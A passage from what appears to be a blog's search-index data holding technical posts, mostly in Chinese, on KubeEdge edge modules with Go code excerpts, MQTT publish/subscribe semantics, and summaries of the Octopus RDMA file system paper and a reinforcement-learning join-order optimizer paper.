定期（默认60s）向子模块发送 “ping” 信息。每个子模块一旦收到 “ping” 信息，就会更新自己的时间戳。控制器检查每个模块的时间戳是否超过 2 分钟，如果超过则重新启动该子模块。 Membership 模块Membership 模块的主要作用是为新设备添加提供资格，该模块将新设备与边缘节点绑定，并在边缘节点和边缘设备之间建立相应关系。它主要执行以下操作： 初始化 memActionCallBack，它的类型是 map[string]Callback，包含可执行的动作函数 接收消息 对于每条消息，都会调用相应动作函数 接收心跳信息，并向控制器发送心跳信号 以下是可由 Membership 模块执行的动作函数： dealMembershipGet：从缓存中获取与特定边缘节点相关的设备信息 dealMembershipUpdated：更新节点的成员信息 dealMembershipDetail：提供了边缘节点的成员详细信息 Twin 模块Twin 模块的主要作用是处理所有与 device twin 相关的操作。它可以执行诸如更新 device twin、获取 device twin 和同步 device twin 到云的操作。它执行的操作与 Membership 模块类似。 以下是可由 Twin 模块执行的动作函数： dealTwinUpdate：更新一个特定设备的 device twin 信息 dealTwinGet：提供一个特定设备的 device twin 信息 dealTwinSync：将 device twin 信息同步到云端 Communication 模块Communication 模块的主要作用是确保设备双胞胎和其他组件之间的通信功能。它主要执行以下操作： 初始化 memActionCallBack，它的类型是 map[string]Callback，包含可执行的动作函数 接收消息 对于每条消息，都会调用相应动作函数 确认消息中指定的动作是否完成，如果动作没有完成则重做该动作 接收心跳信息，并向控制器发送心跳信号 以下是可由 Communication 模块执行的动作函数： dealSendToCloud：用于发送数据到 cloudhub。这个函数首先确保云边是连接的，然后将消息发送到 edgehub 模块，edgehub 将消息转发给云 dealSendToEdge：用于发送数据给边缘的其他模块。这个函数将收到的消息发送到 edgehub 模块，edgehub 将消息转发给其他模块 dealLifeCycle：检查是否连接到云并且 twin 的状态是否为断开，将状态改为连接并将节点的详细信息发送给 edgehub；如果未连接到云，就把 twin 的状态设置为断开 dealConfirm：检查消息的类型是否正确，然后从 ConfirmMap 中删除 msgID Device 模块Device 模块的主要作用是执行与设备有关的操作，如设备状态更新和设备属性更新。它执行的操作与 Membership 模块类似。 以下是可由 Device 模块执行的动作函数： dealDeviceUpdated：处理的是当遇到设备属性更新时要执行的操作。更新设备属性，比如在数据库中增加属性、更新属性和删除属性 dealDeviceStateUpdate：处理的是当遇到设备状态更新时要执行的操作。更新设备的状态以及数据库中设备的最后在线时间 More关于执行动作函数的流程以及 Device，DeviceAttr 与 DeviceTwin 这三张表中字段的描述请见 DeviceTwin。","link":"/2022/02/25/KubeEdge-%E8%BE%B9%E7%BC%98%E9%83%A8%E5%88%86-DeviceTwin-%E7%AE%80%E6%9E%90/"},{"title":"KubeEdge 边缘部分 Edged 简析","text":"本文基于 commit 9a7e140b42abb4bf6bcabada67e3568f73964278。 概述Edged 是运行在边缘节点的代理（轻量化的 kubelet），用于管理容器化的应用程序。Edged 内部模块如图所示： 代码入口Edged 的注册和启动过程代码在 edge/pkg/edged/edged.go 中。 Register 调用了 newEdged，newEdged 做了以下事情： 初始化 pod status 管理器 初始化 edged 的 livenessManager、readinessManager、startupManager 创建并启动作为 grpc 服务器运行的 docker shim 初始化运行时服务 runtimeService 和镜像服务 imageService 初始化容器生命周期管理器 clcm 初始化容器日志管理器 logManager 初始化通用容器运行时服务 containerRuntime 创建运行时缓存 runtimeCache 初始化 edged 的镜像存放地 Provider 初始化镜像垃圾回收管理器 imageGCManager 初始化容器垃圾回收器 containerGCManager 初始化 edged 的 server Start 做了以下事情： 初始化 edged 的 volume plugin 管理器 volumePluginMgr 初始化 edged 节点的模块 新建配置管理器configMapManager 初始化并启动 volume 管理器 volumeManager 启动 edged 的探针管理器 probeManager 启动 pod 状态管理器 statusManager 和 pod 生命周期事件生成器 pleg 启动 pod 增加和删除消息队列 启动 pod 监听事件循环 启动 edged 的 http server 启动镜像和容器的垃圾回收服务 初始化和启动 edged 的插件服务 在 clcm 中启动 CPU 管理器 最后调用 syncPod，启动与 pod 进行事件同步的服务 edged 与容器运行时edged 与容器运行时（container runtime）的调用关系可以总结为下图： 可以看出 edged 首先启动作为 grpc 服务器运行的 docker shim，然后 edged 通过调用 docker shim 的 grpc server，來实现与容器运行时（container runtime）的交互，最后 docker shim 的 grpc server 将 edged 具体操作传递给容器运行时。 edged 如何实现边缘自治首先看 edged 启动时调用的 syncPod，它向 metamanager 发送一条请求（QueryOperation 类型消息），来请求数据库中现有的 pod 信息。然后开始循环接收消息，后面对消息的类型进行判断，类型有 pod、configmap、secret、以及 volume： 123456789101112131415161718192021222324252627282930313233343536373839404142434445func (e *edged) syncPod() { time.Sleep(10 * time.Second) //when starting, send msg to metamanager once to get existing pods info := model.NewMessage(&quot;&quot;).BuildRouter(e.Name(), e.Group(), e.namespace+&quot;/&quot;+model.ResourceTypePod, model.QueryOperation) beehiveContext.Send(metamanager.MetaManagerModuleName, *info) for { ...... result, err := beehiveContext.Receive(e.Name()) ...... switch resType { case model.ResourceTypePod: if op == model.ResponseOperation &amp;&amp; resID == &quot;&quot; &amp;&amp; result.GetSource() == metamanager.MetaManagerModuleName { err := e.handlePodListFromMetaManager(content) if err != nil { klog.Errorf(&quot;handle podList failed: %v&quot;, err) continue } e.setInitPodReady(true) } else if op == model.ResponseOperation &amp;&amp; resID == &quot;&quot; &amp;&amp; result.GetSource() == EdgeController { err := e.handlePodListFromEdgeController(content) if err != nil { klog.Errorf(&quot;handle controllerPodList failed: %v&quot;, err) continue } e.setInitPodReady(true) } else { err := e.handlePod(op, content) if err != nil { klog.Errorf(&quot;handle pod failed: %v&quot;, err) continue } } case model.ResourceTypeConfigmap: ...... case model.ResourceTypeSecret: ...... case constants.CSIResourceTypeVolume: ...... default: ...... } }} 这里重点关心pod，消息需要通过 result.GetSource() 字段判断来源，可能是 MetaManager 来的，也有可能是 EdgeController 来的。在断网环境下只有可能是 MetaManager 发送的。 handlePodListFromMetaManager 遍历收到的消息中的 pod 内容，调用 addPod 将 pod 全部加入 podAdditionQueue 队列，再调用 updatePodStatus 删除或更新 pod，将 pod status 更新到数据库中： 123456789101112131415161718192021222324func (e *edged) handlePodListFromMetaManager(content []byte) (err error) { var lists []string err = json.Unmarshal([]byte(content), &amp;lists) if err != nil { return err } for _, list := range lists { var pod v1.Pod err = json.Unmarshal([]byte(list), &amp;pod) if err != nil { return err } if filterPodByNodeName(&amp;pod, e.nodeName) { e.addPod(&amp;pod) if err = e.updatePodStatus(&amp;pod); err != nil { klog.Errorf(&quot;handlePodListFromMetaManager: update pod %s status error&quot;, pod.Name) return err } } } return nil} 另外 edged 启动时会调用 podAddWorkerRun，它会在后台不断从 podAdditionQueue 中 get，后面就和 kubelet 一样开始创建容器。 More关于 Edged 部分内部模块执行的流程图请见 Edged。","link":"/2022/02/28/KubeEdge-%E8%BE%B9%E7%BC%98%E9%83%A8%E5%88%86-Edged-%E7%AE%80%E6%9E%90/"},{"title":"KubeEdge 边缘部分 EventBus&amp;ServiceBus 简析","text":"本文基于 commit 9a7e140b42abb4bf6bcabada67e3568f73964278。 概述EventBus 是一个与 MQTT 服务器 (mosquitto) 交互的 MQTT 客户端，为其他组件提供订阅和发布功能；ServiceBus 是一个运行在边缘的 HTTP 客户端。 EventBusedge/pkg/eventbus/eventbus.go： 123456789101112131415161718192021222324252627282930313233func (eb *eventbus) Start() { if eventconfig.Config.MqttMode &gt;= v1alpha1.MqttModeBoth { hub := &amp;mqttBus.Client{ MQTTUrl: eventconfig.Config.MqttServerExternal, SubClientID: eventconfig.Config.MqttSubClientID, PubClientID: eventconfig.Config.MqttPubClientID, Username: eventconfig.Config.MqttUsername, Password: eventconfig.Config.MqttPassword, } mqttBus.MQTTHub = hub hub.InitSubClient() hub.InitPubClient() klog.Infof(&quot;Init Sub And Pub Client for external mqtt broker %v successfully&quot;, eventconfig.Config.MqttServerExternal) } if eventconfig.Config.MqttMode &lt;= v1alpha1.MqttModeBoth { // launch an internal mqtt server only mqttServer = mqttBus.NewMqttServer( int(eventconfig.Config.MqttSessionQueueSize), eventconfig.Config.MqttServerInternal, eventconfig.Config.MqttRetain, int(eventconfig.Config.MqttQOS)) mqttServer.InitInternalTopics() err := mqttServer.Run() if err != nil { klog.Errorf(&quot;Launch internal mqtt broker failed, %s&quot;, err.Error()) os.Exit(1) } klog.Infof(&quot;Launch internal mqtt broker %v successfully&quot;, eventconfig.Config.MqttServerInternal) } eb.pubCloudMsgToEdge()} MqttMode 分 MqttModeInternal、MqttModeBoth 和 MqttModeExternal 三种。当 eventconfig.Config.MqttMode &gt;= v1alpha1.MqttModeBoth 将 MQTT 代理启动在 eventbus 之外，eventbus 作为独立启动的 MQTT 代理的客户端与其交互；当 eventconfig.Config.MqttMode &lt;= v1alpha1.MqttModeBoth 时，在 eventbus 内启动一个 MQTT 代理，负责与终端设备交互。 InitSubClientInitSubClient 设置参数启动 subscribe 连接： 123456789101112131415161718func (mq *Client) InitSubClient() { timeStr := strconv.FormatInt(time.Now().UnixNano()/1e6, 10) right := len(timeStr) if right &gt; 10 { right = 10 } // if SubClientID is NOT set, we need to generate it by ourselves. if mq.SubClientID == &quot;&quot; { mq.SubClientID = fmt.Sprintf(&quot;hub-client-sub-%s&quot;, timeStr[0:right]) } subOpts := util.HubClientInit(mq.MQTTUrl, mq.SubClientID, mq.Username, mq.Password) subOpts.OnConnect = onSubConnect subOpts.AutoReconnect = false subOpts.OnConnectionLost = onSubConnectionLost mq.SubCli = MQTT.NewClient(subOpts) util.LoopConnect(mq.SubClientID, mq.SubCli) klog.Info(&quot;finish hub-client sub&quot;)} onSubConnect 和 onSubConnectionLost 定义了当连接和失联时的处理逻辑。eventbus 订阅以下 topic： 123456789// SubTopics which edge-client should be subSubTopics = []string{ &quot;$hw/events/upload/#&quot;, &quot;$hw/events/device/+/state/update&quot;, &quot;$hw/events/device/+/twin/+&quot;, &quot;$hw/events/node/+/membership/get&quot;, UploadTopic, &quot;+/user/#&quot;,} 当获得这些 topic 消息时，通过 mqtt 的 subscribe 方法回调 OnSubMessageReceived。该函数判断 topic，”hw/events/device” 和 “hw/events/node” 开头发送给 DeviceTwin 模块，其他信息发送给 EdgeHub 模块： 1234567891011121314151617181920212223// OnSubMessageReceived msg received callbackfunc OnSubMessageReceived(client MQTT.Client, msg MQTT.Message) { klog.Infof(&quot;OnSubMessageReceived receive msg from topic: %s&quot;, msg.Topic()) // for &quot;$hw/events/device/+/twin/+&quot;, &quot;$hw/events/node/+/membership/get&quot;, send to twin // for other, send to hub // for &quot;SYS/dis/upload_records&quot;, no need to base64 topic var target string var message *beehiveModel.Message if strings.HasPrefix(msg.Topic(), &quot;$hw/events/device&quot;) || strings.HasPrefix(msg.Topic(), &quot;$hw/events/node&quot;) { target = modules.TwinGroup resource := base64.URLEncoding.EncodeToString([]byte(msg.Topic())) // routing key will be $hw.&lt;project_id&gt;.events.user.bus.response.cluster.&lt;cluster_id&gt;.node.&lt;node_id&gt;.&lt;base64_topic&gt; message = beehiveModel.NewMessage(&quot;&quot;).BuildRouter(modules.BusGroup, modules.UserGroup, resource, messagepkg.OperationResponse).FillBody(string(msg.Payload())) } else { target = modules.HubGroup message = beehiveModel.NewMessage(&quot;&quot;).BuildRouter(modules.BusGroup, modules.UserGroup, msg.Topic(), beehiveModel.UploadOperation).FillBody(string(msg.Payload())) } klog.Info(fmt.Sprintf(&quot;Received msg from mqttserver, deliver to %s with resource %s&quot;, target, message.GetResource())) beehiveContext.SendToGroup(target, *message)} InitPubClient123456789101112131415161718// InitPubClient init pub clientfunc (mq *Client) InitPubClient() { timeStr := strconv.FormatInt(time.Now().UnixNano()/1e6, 10) right := len(timeStr) if right &gt; 10 { right = 10 } // if PubClientID is NOT set, we need to generate it by ourselves. if mq.PubClientID == &quot;&quot; { mq.PubClientID = fmt.Sprintf(&quot;hub-client-pub-%s&quot;, timeStr[0:right]) } pubOpts := util.HubClientInit(mq.MQTTUrl, mq.PubClientID, mq.Username, mq.Password) pubOpts.OnConnectionLost = onPubConnectionLost pubOpts.AutoReconnect = false mq.PubCli = MQTT.NewClient(pubOpts) util.LoopConnect(mq.PubClientID, mq.PubCli) klog.Info(&quot;finish hub-client pub&quot;)} InitPubClient 创建了一个 MQTT client，然后调用 LoopConnect 每 5 秒钟连接一次 MQTT server，直到连接成功。如果失去连接，则通过 onPubConnectionLost 继续调用 InitPubClient。 pubCloudMsgToEdge在启动/连接完 MQTT server 后，调用了 pubCloudMsgToEdge 方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758func (eb *eventbus) pubCloudMsgToEdge() { for { select { case &lt;-beehiveContext.Done(): klog.Warning(&quot;EventBus PubCloudMsg To Edge stop&quot;) return default: } accessInfo, err := beehiveContext.Receive(eb.Name()) if err != nil { klog.Errorf(&quot;Fail to get a message from channel: %v&quot;, err) continue } operation := accessInfo.GetOperation() resource := accessInfo.GetResource() switch operation { case messagepkg.OperationSubscribe: eb.subscribe(resource) klog.Infof(&quot;Edge-hub-cli subscribe topic to %s&quot;, resource) case messagepkg.OperationUnsubscribe: eb.unsubscribe(resource) klog.Infof(&quot;Edge-hub-cli unsubscribe topic to %s&quot;, resource) case messagepkg.OperationMessage: body, ok := accessInfo.GetContent().(map[string]interface{}) if !ok { klog.Errorf(&quot;Message is not map type&quot;) continue } message := body[&quot;message&quot;].(map[string]interface{}) topic := message[&quot;topic&quot;].(string) payload, _ := json.Marshal(&amp;message) eb.publish(topic, payload) case messagepkg.OperationPublish: topic := resource // cloud and edge will send different type of content, need to check payload, ok := accessInfo.GetContent().([]byte) if !ok { content, ok := accessInfo.GetContent().(string) if !ok { klog.Errorf(&quot;Message is not []byte or string&quot;) continue } payload = []byte(content) } eb.publish(topic, payload) case messagepkg.OperationGetResult: if resource != &quot;auth_info&quot; { klog.Info(&quot;Skip none auth_info get_result message&quot;) continue } topic := fmt.Sprintf(&quot;$hw/events/node/%s/authInfo/get/result&quot;, eventconfig.Config.NodeName) payload, _ := json.Marshal(accessInfo.GetContent()) eb.publish(topic, payload) default: klog.Warningf(&quot;Action not found&quot;) } }} pubCloudMsgToEdge 执行以下操作： 从 beehive 获取消息 获取消息的 operation 和 resource 当动作为 subscribe 时从 MQTT 订阅 resource(topic) 消息；当动作为 unsubscribe 时从 MQTT 取消订阅 resource(topic) 消息 当动作为 message 时，将消息的 message 根据消息的 topic 发送给 MQTT broker，消息类型是一个 map 当动作为 publish 时，将消息发送给 MQTT broker，消息为一个字符串，topic 和 resource 一致 当动作为 getResult 时，resource 必须为 auth_info，然后发送消息到 “hw/events/node/eventconfig.Config.NodeName/authInfo/get/result” 这一个 topic ServiceBusedge/pkg/servicebus/servicebus.go： 12345678910111213141516171819202122232425262728func (sb *servicebus) Start() { // no need to call TopicInit now, we have fixed topic htc.Timeout = time.Second * 10 uc.Client = htc if !dao.IsTableEmpty() { if atomic.CompareAndSwapInt32(&amp;inited, 0, 1) { go server(c) } } //Get message from channel for { select { case &lt;-beehiveContext.Done(): klog.Warning(&quot;servicebus stop&quot;) return default: } msg, err := beehiveContext.Receive(modules.ServiceBusModuleName) if err != nil { klog.Warningf(&quot;servicebus receive msg error %v&quot;, err) continue } // build new message with required field &amp; send message to servicebus klog.V(4).Info(&quot;servicebus receive msg&quot;) go processMessage(&amp;msg) }} ServiceBus 接受来自 beehive 的消息，然后启动一个 processMessage 协程基于消息中带的参数，将消息通过 REST-API 发送到本地 127.0.0.1 上的目标 APP。相当于一个客户端，而 APP 是一个 http Rest-API server，所有的操作和设备状态都需要客户端调用接口来下发和获取。ServiceBus 执行过程图如下： 参考 kubeedge edgecore - EventBus源码分析 【KubeEdge】 ServiceBus分析","link":"/2022/02/28/KubeEdge-%E8%BE%B9%E7%BC%98%E9%83%A8%E5%88%86-EventBus-ServiceBus-%E7%AE%80%E6%9E%90/"},{"title":"MQTT Publish&#x2F;Subscribe","text":"PublishEach message must include a topic, through which the broker delivers the message to clients interested in that topic. The specific content of the message is passed in binary form. MQTT is agnostic to the content of the message, and the client can send data in any format, such as binary data, text data, XML data, or JSON data, etc. Format The topic is a hierarchical structure composed of strings separated by slashes, for example, “home/bedroom/temperature”. Quality of ServiceQuality of Service determines the guarantee level for message delivery to the target. Quality of Service is divided into three levels: 0, 1, 2. 0 means the message is delivered at most once, and if it fails, no retries will be made. 1 means the message is delivered at least once, and if the recipient does not explicitly receive it (returns acked), it will continue to retry sending. 2 means the message is delivered exactly once. Retain FlagThe retain flag determines whether the message is retained as the latest message for this topic. When a new client subscribes to this topic, it will receive the latest retained message for this topic. For each topic, there can be at most one retained message, but there may also be none. Message PayloadThe message payload is the specific content of the message. MQTT is unaware of the content of the message, so users can send any message. Duplicate FieldWhen the quality of service of the message is greater than 0, this field is set when the message is retried. QoS LevelsMQTT supports three Quality of Service (QoS) levels. They are defined as follows: QoS 0: At most once deliveryThis is the lowest level of service. A message is delivered at most once, and it might not be delivered at all if network disruptions occur. The message is sent from the sender (publisher) to the receiver (subscriber) without any confirmation message. There is no retransmission of the message. QoS 1: At least once deliveryIn this level of service, a message is assured to be delivered at least once to the receiver. After the sender sends the message, it stores a copy of the message until it receives a PUBACK message from the receiver. If the sender does not receive a PUBACK message within a certain period, it will resend the message. QoS 2: Exactly once deliveryThis is the highest level of service, where a message is assured to be delivered exactly once. This is achieved using a four-step handshake process: The sender sends the message and keeps a copy of it. The message is marked as “unconfirmed”. The receiver responds with a PUBREC message to acknowledge receipt of the message. The sender receives the PUBREC message, removes the “unconfirmed” mark from the stored message, and responds with a PUBREL message. Finally, the receiver responds with a PUBCOMP message to confirm that it has processed the PUBREL message. The sender can now safely delete the message from its storage. Each level of service has different trade-offs in terms of network traffic, latency, and complexity. You should choose the appropriate QoS level based on the specific requirements of your application. SubscribeIf no client subscribes to a topic, any messages published to that topic won’t be received by any client. Clients need to send a subscription request to the broker in order to subscribe to the corresponding topic. Format Packet IdentifierThis is a unique identifier for each SUBSCRIBE message. Both the broker and client maintain their own Packet Identifier for each ongoing conversation. The identifier doesn’t need to be globally unique, but it does need to be unique within the scope of the client-broker communication session. Subscription ListA single SUBSCRIBE message can request multiple topic subscriptions. Each subscription request needs to include the topic to be subscribed to and the desired Quality of Service (QoS) level. The topic string in the SUBSCRIBE packet can include wildcard characters. If the same topic is subscribed to with different QoS levels (i.e., overlapping subscriptions), the broker will deliver messages to the client at the highest QoS level that has been granted. Subscription AcknowledgementAfter the client requests to subscribe to a topic, the broker will respond with a SUBACK. FormatThe message includes a Packet Identifier that matches the one in the subscription request, as well as a set of return codes, as shown below: Packet IdentifierThis Packet Identifier should match the one in the corresponding subscription request. Return CodesThe return codes correspond to the QoS-topic list in the subscription request, confirming the result of each subscription one-to-one. If successful, the corresponding Quality of Service (0/1/2) will be returned. If the subscription fails, the return code will be 0x80 (128 in decimal). After the client initiates a subscription and receives a successful subscription acknowledgement, this client will be able to normally receive any subsequent messages sent to that topic. UnsubscribeThe UNSUBSCRIBE packet is as follows, mainly containing a Packet Identifier and a list of topics to be unsubscribed: Unsubscribe AcknowledgementThe return for an UNSUBSCRIBE request is an UNSUBACK message that only contains a Packet Identifier matching the one in the UNSUBSCRIBE request. An UNSUBACK is sent regardless of whether the topic was previously subscribed to or not. ConclusionMQTT message delivery is implemented through subscribing to specific topics, then publishing messages to those topics. There’s no need to create and maintain topics before publishing, nor worry about whether there are clients subscribing to specific topics. The Publish/Subscribe model decouples publishers and subscribers, making it easier to arrange various business scenarios, such as implementing grouping, broadcasting, etc. However, the Publish/Subscribe model also brings a challenge: if the publisher wishes to be aware of the subscriber’s receipt of a message, this can only be accomplished at the application layer. For example, after a subscriber receives a message, it can publish a confirmation message to the publisher through another topic.","link":"/2023/07/21/MQTT-Publish-Subscribe/"},{"title":"Octopus: an RDMA-enabled Distributed Persistent Memory File System","text":"概述Octopus 通过 NVM + RDMA 实现了分布式文件系统，主要贡献总结如下： 提出了基于 RDMA 的新型 I/O 流，它直接访问持久化共享内存池，而无需经过文件系统层层调用，并在客户端主动获取或发送数据以重新平衡服务器和网络负载。 利用 RDMA 原语重新设计元数据机制，包括自标识元数据 RPC 来用于低延迟通知，以及收集-调度分布式事务实现低一致性开销。 有效地利用了硬件性能，显著优于现有 RDMA 优化的分布式文件系统。 挑战 之前由于存储介质较慢，访问持久化存储介质的开销几乎占据了文件系统操作的全部，软件栈的优化对整体性能的影响微乎其微，所以之前的存储层与网络层往往采用松耦合的设计模式来使得系统更容易理解与实现。而对于 NVM 上的文件系统来说，由于 NVM 的访问时延接近内存，使得软件栈的开销几乎占据了文件系统操作的全部，现在优化软件栈开销成为优化系统最重要的手段。 现有的文件系统利用新硬件高带宽的效率低下。这主要有四个原因：(1)数据在应用缓冲区、文件系统页缓存、网卡缓冲等区域之间来回拷贝，增加了软件开销；(2)服务器每秒需要处理的大量请求，server 端 CPU 成为瓶颈；(3)基于事件驱动模型的传统 RPC 具有相对较高的延迟；(4)分布式文件系统中使用到的分布式事务等需要多次的网络来回，处理逻辑较为复杂，使得分布式文件系统用在一致性上的开销较大。 设计总体架构 Octopus 文件系统数据分散在集群节点中，一个文件根据路径名使用一致性哈希保存在一个节点中，文件没有做冗余，RDMA 与存储层紧耦合设计。每个节点的 NVM 分为私有部分和共享部分。私有部分保存该节点文件的元数据，只允许本节点内访问，客户端通过 RPC 访问；共享部分保存该节点中文件的数据，客户端可以通过 RDMA 单边原语直接读写。Octopus 使用 RDMA write-with-imm 进行 RPC。 数据布局 Octopus 每个节点的 NVM 划分为 6 个区域，每个区域是共享的或私有的。这六个区域的内容为： Super Block：用于存储文件系统的超级块 Message Pool：元数据 RPC 的通信缓冲区 Metadata Index Zone：使用哈希表保存文件索引 Metadata Zone：具体的文件元数据保存区域 Data Zone：文件数据的保存区域 Log Zone：事务日志区域 High-Throughput Data I/OOctopus 引入了共享持久化内存池来减少数据拷贝以获得更高的带宽，并且在客户端主动执行 I/O 来重新平衡服务器和网络开销以获得更高的吞吐量。 Shared Persistent Memory Pool 如图所示，GlusterFS 里同一个数据在传输过程中拷贝了 7 次，Octopus 利用共享持久化内存池取消层次抽象，以及通过 RDMA 取消缓存，将数据拷贝降低到了 4 次。 Client-Active Data I/OOctopus 提出了 Client-Active Data I/O 数据访问模式，充分发挥了 RDMA 的优势，降低了服务端 CPU 的负载。 传统的数据交互为 Server-Active Data I/O 方式，如图中的(a)所示，客户端给服务端发送数据访问请求，服务端查找到数据的位置后读取对应的数据，并把最终的数据返回给客户端。而 Client-Active Data I/O 方式则与此不同，如图中的(b)所示，客户端使用自标识元数据 RPC 发送读写请求和访问元数据，然后根据元数据信息使用 RDMA Read/Write 直接读写文件数据。Client-Active 与 Server-Active 相比，服务端 CPU 执行一个请求的操作较少，将读数据操作转移给了客户端进行，从而降低了服务端 CPU 的负载。 Low-Latency Metadata AccessRDMA 为远程数据访问提供微秒级访问延迟。为了在文件系统发挥这一优势，Octopus 通过合并 RDMA 写入和原子原语重构了元数据 RPC 和分布式事务。 Self-identified metadata RPCRDMA 具有低延迟高带宽的优势，在 RPC 中使用 RDMA 能够提高吞吐量。以往的 RDMA RPC 大多使用双边 RDMA 原语，而双边 RDMA 具有相对较高的延迟和较低的吞吐量，减小了 RDMA 的优势。而单边 RDMA 原语不会在完成时通知 CPU，若使用单边 RDMA 进行 RPC，服务器需要有单独的线程轮询消息缓冲区，使 CPU 的负载进一步增大。为了保持 RDMA 低延迟的优势并减少 CPU 的负载，Octopus 提出了 Self-identified metadata RPC（自标识元数据 RPC）。自标识元数据 RPC 使用 RDMA write_with_imm 命令将发送者的标识信息附加到 RDMA 请求中。write_with_imm 与传统的 RDMA Write 相比有以下两点不同：(1) 它能够在消息中携带一个立即数；(2)它能够在服务器网卡接收到该请求后立即通知服务器 CPU，这会消耗服务器的 QP 中的一个 Recv WR。因此，使用 write_with_imm 能够让服务器及时收到 RPC 请求，且无需 CPU 进行轮询。立即数字段中附加有客户端标识符 node_id 和客户端接收缓冲区的 offset。node_id 可帮助服务器定位对应消息而无需扫描整个缓冲区。请求处理完成之后，服务器使用 RDMA Write 原语将数据返回到标识符为 node_id 的客户端中偏移量地址 offset 处。 Collect-Dispatch Transaction 在文件系统中，某些操作可能会使用分布式事务进行，如 mkdir，mknod，rmnod 和 rmdir 等等。这些操作需要在多个服务器之间原子性地更新元数据。在之前的分布式文件系统中，往往使用两阶段提交（2PC）完成事务操作。然而两阶段提交由于其分布式的日志以及对锁和日志的协调而导致高昂的开销。Octopus 设计了一个新的分布式事务协议：Collect-Dispatch Transaction，该协议分为收集阶段（Collect Phase）和分发阶段（Dispatch Phase）。该事务协议利用了 RDMA 原语进行服务器间的交互，关键思想在于两个方面，分别是崩溃一致性和并发控制： 带有远程更新的本地日志来实现崩溃一致性。在收集阶段，Octopus 从参与者收集读写集合，并在协调者中执行本地事务，记录日志。由于参与者不需要保留日志记录，因此无需为协调者和参与者之间的持久化日志进行复杂的协商，从而减少了协议的开销。在分发阶段，协调者使用 RDMA write 将更新的写集合分发给参与者，并使用 RDMA atomic 原语释放相应的锁，而不涉及到参与者 CPU。 混合使用 GCC 和 RDMA 锁来实现并发控制。在 Collect-Dispatch 事务中，协调者和参与者使用 GCC 的 Compare-and-Swap 命令在本地添加锁。解锁时，协调者使用 GCC 的 Compare-and-Swap 命令释放本地锁，并使用 RDMA 的 Compare-and-Swap 命令释放远端每个参与者的锁，解锁操作不涉及到参与者的 CPU，因此优化了解锁阶段。 总的来说，Collect-Dispatch Transaction 需要一次 RPC（COLLECT-REQ 和 WRITE-SET）、一次 RDMA Write（UPDATE WRITESET）和一次 RDMA Atomic（REMOTE UNLOCK），而两阶段提交需要两次 RPC。Collect-Dispatch Transaction 与 2PC 相比具有较低的开销，这是因为：(1) 一次 RPC 比一次 RDMA Write/Atomic 原语具有更高的延迟；(2) RDMA Write/Atomic 原语不需要服务端 CPU 的介入。 总结Octopus 其核心思想是 RDMA 与 NVM 紧耦合设计，设计了一系列机制来实现高吞吐量的数据 I/O 以及低延迟的元数据访问。但在分布式方面该文件系统没有做冗余，也没有考虑负载均衡等内容，只是通过一致性哈希将数据分散到不同节点上。 参考 Lu, Youyou, et al. “Octopus: An RDMA-Enabled Distributed Persistent Memory File System.” USENIX ATC ’17 Proceedings of the 2017 USENIX Conference on Usenix Annual Technical Conference, 2017, pp. 773–785.","link":"/2021/08/09/Octopus-an-RDMA-enabled-Distributed-Persistent-Memory-File-System/"},{"title":"Learning to Optimize Join Queries With Deep Reinforcement Learning","text":"Background传统的多表 join 算法采用的是动态规划： 从初始 query graph 开始 找到 cost 最少的 join 更新 query graph 直到只剩下一个节点。但这种贪心策略并不会保证一定会选到合适的 join order，因为它只直观表示了每个 join 的短期cost。例如： 动态规划的结果 cost 为 140，而最优解的 cost 为 110。 Learning to Optimize Join Queries With Deep Reinforcement Learning 论文中将 join 问题表示为马尔可夫决策过程（MDP），然后构建了一个使用深度 Q 网络（DQN）的优化器，用来有效地优化 join 顺序。 Method将连接排序表示为 MDP： 状态G：a query graph 动作c：a join 下一个状态G’：join后的query graph 奖励J(c)：join的估算成本 用 Q-Learning 算法来解决 join 顺序 MDP。在 Q-Learning 中最关键的是得到 Q 函数 Q(G,c)，它可以知道当前 query graph 中进行每个 join 的长期cost。如果我们可以访问真正的 Q(G,c)，就可以对传统的动态规划进行改进： 从初始 query graph 开始 找到 Q(G,c) 值最小的 join 更新 query graph 直到只剩下一个节点，从而得到最优的 join order。实际上我们无法访问真正的 Q 函数，因此，我们需要训练一个神经网络，它接收 (G,c) 作为输入，并输出估算的 Q(G,c)。在论文中算法如下，给定query： 状态 G 和动作 c 的特征化 query graph 中的每个关系的所有属性放入集合 A-G 中；join 左侧的所有属性放入集合 A-L 中；join 右侧的所有属性放入集合 A-R 中。并使用 1-hot 向量来编码。对于该例子，论文中表示如下： 对于查询中的每个选择，我们可以获得 selectivity ∈ [0,1]（用来估计选择后存在的元组占选择前总元组的比例），我们需要根据 selectivity 的值去更新向量。例如： 还可以根据在物理计划中选择的具体 join 算法去产生新的 1-hot 向量（例如，IndexJoin 为 [1 0], HashJoin 为 [0 1]）,与原向量进行串联，如下： 根据在论文 2.5 节的假设： 在这里我们就可以知道 query graph 特征 fG 为 fG = AG，join 决策特征 fc 为 fc = A-L ⊕ A-R，对于一个特定的元组（G,c）特征化为 fG ⊕ fc。 模型训练DQ 使用多层感知机（MLP）神经网络来表示 Q 函数。它以（G,c）的最终特征化 fG ⊕ fc 作为输入。在实验中发现，两层的 MLP 可以提供最佳表现。模型使用随机梯度下降算法进行训练。 执行训练后，在原有基础上再对多表 join 算法进行改进： 从初始 query graph 开始 使每个 join 特征化 找到模型估计的 Q 值最小的 join（即神经网络的输出） 更新 query graph 直到只剩下一个节点，从而得到最优的 join order。在执行过程中，还可以对 DQ 进行进一步微调。 Experiment Result论文中使用了 Join Order Benchmark（JOB） 来评估 DQ。这个数据库由来自 IMDB 的 21 个表组成，并提供了 33 个查询模板和 113 个查询。查询中的连接关系大小范围为 5 到 15 个。当连接关系的数量不超过 10 个时，DQ 从穷举中收集训练数据。 将 DQ 与几个启发式优化器（QuickPick 和 KBZ）以及经典动态规划（left-deep、right-deep、zig-zag）进行比较。对每个优化器生成的计划进行评分，并与最优计划（通过穷举获得）进行比较。此外，论文中设计了 3 个成本模型： Cost Model 1（Index Mostly）：模拟内存数据库并鼓励使用索引连接 Cost Model 2（Hybrid Hash）：仅考虑具有内存预算的散列连接和嵌套循环连接 Cost Model 3（Hash Reuse）：考虑重用已构建的散列表 进行了 4 轮交叉验证后，确保仅对未出现在训练工作负载中的查询进行 DQ 评估（对于每种情况，论文中在 80 个查询上训练并测试其中的 33 个）。计算查询的平均次优性，即“成本（算法计划）/ 成本（最佳计划）”，这个数字越低越好。例如，对 Const Model 1，DQ 平均距离最佳计划 1.32 倍。结果如下： 在所有成本模型中，DQ 